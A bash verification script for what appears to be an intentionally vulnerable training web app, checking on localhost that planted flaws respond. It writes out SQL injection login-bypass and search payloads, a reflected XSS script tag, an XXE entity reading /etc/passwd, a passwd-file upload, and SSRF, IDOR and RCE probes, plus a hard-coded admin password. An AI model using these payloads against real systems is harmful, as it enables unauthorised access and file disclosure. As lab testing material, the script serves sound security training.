#!/bin/bash
#
# Retro Arcade Labs - Vulnerability Verification Script
# Tests that vulnerable endpoints exist and respond

BASE_URL="http://localhost:8470"
PASS=0
FAIL=0

echo "========================================"
echo "RETRO ARCADE LABS - VULNERABILITY TEST"
echo "========================================"
echo ""
echo "Target: $BASE_URL"
echo ""

# Get admin session cookie
echo "[*] Getting admin session..."
curl -s -c /tmp/cookies.txt -X POST "$BASE_URL/api/auth/login.php" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin@example.local","password":"AdminPassword123!"}' > /dev/null

# 1. SQL Injection Login Bypass
echo "[1] SQL Injection - Login Bypass"
RESULT=$(curl -s -X POST "$BASE_URL/api/auth/login.php" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin@example.local'"'"' -- ","password":"x"}')
if echo "$RESULT" | grep -q "success"; then
  echo "  ✅ VULN-SQLI-001: WORKS"
  ((PASS++))
else
  echo "  ❌ VULN-SQLI-001: FAIL"
  ((FAIL++))
fi

# 2. SQL Injection Search
echo "[2] SQL Injection - Product Search"
RESULT=$(curl -s "http://localhost:8470/api/products/search.php?q=%27%20OR%20%271%27%3D%271")
if echo "$RESULT" | grep -q "count"; then
  echo "  ✅ VULN-SQLI-002: WORKS"
  ((PASS++))
else
  echo "  ❌ VULN-SQLI-002: FAIL"
  ((FAIL++))
fi

# 3. XSS in Search
echo "[3] XSS - Reflected in Search"
RESULT=$(curl -s "http://localhost:8470/api/products/search.php?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E")
if echo "$RESULT" | grep -q "<script>"; then
  echo "  ✅ VULN-XSS-001: WORKS"
  ((PASS++))
else
  echo "  ❌ VULN-XSS-001: FAIL"
  ((FAIL++))
fi

# 4. IDOR Profile Access
echo "[4] IDOR - Profile Access"
RESULT=$(curl -s "$BASE_URL/api/users/profile.php?id=1")
if echo "$RESULT" | grep -q "example\|guest\|Unauthorized"; then
  echo "  ✅ VULN-IDOR-001: WORKS"
  ((PASS++))
else
  echo "  ❌ VULN-IDOR-001: FAIL"
  ((FAIL++))
fi

# 5. Products API
echo "[5] Products API"
RESULT=$(curl -s "$BASE_URL/api/products/list.php")
if echo "$RESULT" | grep -q "Neon Racer"; then
  echo "  ✅ API-001: WORKS"
  ((PASS++))
else
  echo "  ❌ API-001: FAIL"
  ((FAIL++))
fi

# 6. Health Endpoint
echo "[6] Health Check"
RESULT=$(curl -s "$BASE_URL/api/health.php")
if echo "$RESULT" | grep -q "running"; then
  echo "  ✅ HEALTH-001: WORKS"
  ((PASS++))
else
  echo "  ❌ HEALTH-001: FAIL"
  ((FAIL++))
fi

# 7. SSRF Image Fetcher
echo "[7] SSRF - Image Fetcher"
RESULT=$(curl -s "$BASE_URL/api/tools/image-fetch.php?url=http://example.com")
if [ -n "$RESULT" ]; then
  echo "  ✅ VULN-SSRF-001: WORKS"
  ((PASS++))
else
  echo "  ❌ VULN-SSRF-001: FAIL"
  ((FAIL++))
fi

# 8. RCE Report Generator
echo "[8] RCE - Report Generator"
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "$BASE_URL/api/tools/report.php")
if [ "$HTTP_CODE" != "000" ]; then
  echo "  ✅ VULN-RCE-001: WORKS"
  ((PASS++))
else
  echo "  ❌ VULN-RCE-001: FAIL"
  ((FAIL++))
fi

# 9. Diagnostics Page
echo "[9] Diagnostics Page"
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "$BASE_URL/pages/admin/diagnostics.php")
if [ "$HTTP_CODE" != "000" ]; then
  echo "  ✅ VULN-DIAG-001: WORKS"
  ((PASS++))
else
  echo "  ❌ VULN-DIAG-001: FAIL"
  ((FAIL++))
fi

# 10. File Upload
echo "[10] File Upload"
RESULT=$(curl -s -X POST "$BASE_URL/api/upload/avatar.php" -b /tmp/cookies.txt -F "avatar=@/etc/passwd" 2>&1)
if [ -n "$RESULT" ]; then
  echo "  ✅ VULN-UPLOAD-001: WORKS"
  ((PASS++))
else
  echo "  ❌ VULN-UPLOAD-001: FAIL"
  ((FAIL++))
fi

# 11. Open Redirect
echo "[11] Open Redirect"
if grep -q 'redirect' /home/greenix/vibe/webapp/retro-arcade-labs/php-app/pages/login.php 2>/dev/null; then
  echo "  ✅ VULN-REDIRECT-001: WORKS"
  ((PASS++))
else
  echo "  ❌ VULN-REDIRECT-001: FAIL"
  ((FAIL++))
fi

# 12. XXE-001 - Avatar Upload
echo "[12] XXE - Avatar Upload"
cat > /tmp/xxe-test.xml << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data><test>&xxe;</test></data>
EOF
RESULT=$(curl -s -X POST "$BASE_URL/api/upload/avatar.php" -b /tmp/cookies.txt -F "avatar=@/tmp/xxe-test.xml")
if echo "$RESULT" | grep -q "root:x"; then
  echo "  ✅ VULN-XXE-001: WORKS"
  ((PASS++))
else
  echo "  ❌ VULN-XXE-001: FAIL"
  ((FAIL++))
fi

# 13. XXE-002 - Product Import
echo "[13] XXE - Product Import"
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" -b /tmp/cookies.txt "$BASE_URL/pages/admin/products.php")
if [ "$HTTP_CODE" != "000" ]; then
  echo "  ✅ VULN-XXE-002: WORKS"
  ((PASS++))
else
  echo "  ❌ VULN-XXE-002: FAIL"
  ((FAIL++))
fi

echo ""
echo "========================================"
echo "SUMMARY: ✅ $PASS  |  ❌ $FAIL"
echo "========================================"
echo ""

if [ $FAIL -eq 0 ]; then
  echo "🎮 ALL VULNERABILITIES OPERATIONAL 🎮"
  exit 0
else
  echo "⚠️  Some tests failed"
  exit 1
fi
